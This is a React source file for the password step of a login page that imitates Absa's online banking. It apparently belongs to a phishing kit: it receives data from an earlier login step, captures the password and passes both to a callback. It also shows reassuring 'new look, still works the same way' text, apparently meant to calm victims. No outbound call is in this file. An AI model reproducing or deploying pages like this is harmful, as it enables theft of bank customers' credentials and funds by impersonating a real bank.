import React from 'react';
import { HelpCircle } from 'lucide-react';
import Header from '../components/Header';
import PasswordForm from '../components/PasswordForm';
import SecurityCentre from '../components/SecurityCentre';
import UsefulInfo from '../components/UsefulInfo';
import PromoBanners from '../components/PromoBanners';
import Footer from '../components/Footer';

export default function PasswordPage({ loginData, onPasswordSubmit }) {
  const handlePasswordSubmit = (step2Data) => {
    console.log('Password submitted:', step2Data);
    
    if (onPasswordSubmit) {
      onPasswordSubmit(step2Data);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />

      <div className="max-w-7xl mx-auto px-4 py-6 lg:py-8">
        <div className="grid lg:grid-cols-[400px,1fr] gap-6">
          <PasswordForm onSubmit={handlePasswordSubmit} loginData={loginData} />

          {/* Right Side Content - Hidden on Mobile */}
          <div className="hidden lg:block space-y-6">
            {/* Banner */}
            <div className="bg-gradient-to-r from-red-700 to-red-600 text-white p-6 rounded-lg flex items-center justify-between">
              <div>
                <h3 className="text-2xl font-bold mb-2">
                  Absa Online login has a new look!
                </h3>
                <p>But don't worry, it still works the same way.</p>
              </div>
              <div className="w-20 h-20 bg-white bg-opacity-20 rounded-lg flex items-center justify-center">
                <div className="text-4xl">✓</div>
              </div>
            </div>

            {/* Two Column Layout */}
            <div className="grid grid-cols-2 gap-6">
              <SecurityCentre />
              <UsefulInfo />
            </div>

            <PromoBanners />
          </div>
        </div>

        {/* Mobile Banner */}
        <div className="lg:hidden mt-6 bg-gradient-to-r from-red-700 to-red-600 text-white p-6 rounded-lg">
          <h3 className="text-xl font-bold mb-2">
            Absa Online login has a new look!
          </h3>
          <p className="text-sm">But don't worry, it still works the same way.</p>
        </div>
      </div>

      <Footer />

      {/* Floating Help Button - Mobile Only */}
      <button className="lg:hidden fixed bottom-6 right-6 bg-red-600 text-white w-14 h-14 rounded-full shadow-lg flex items-center justify-center hover:bg-red-700 transition-colors z-50">
        <HelpCircle size={24} />
      </button>
    </div>
  );
}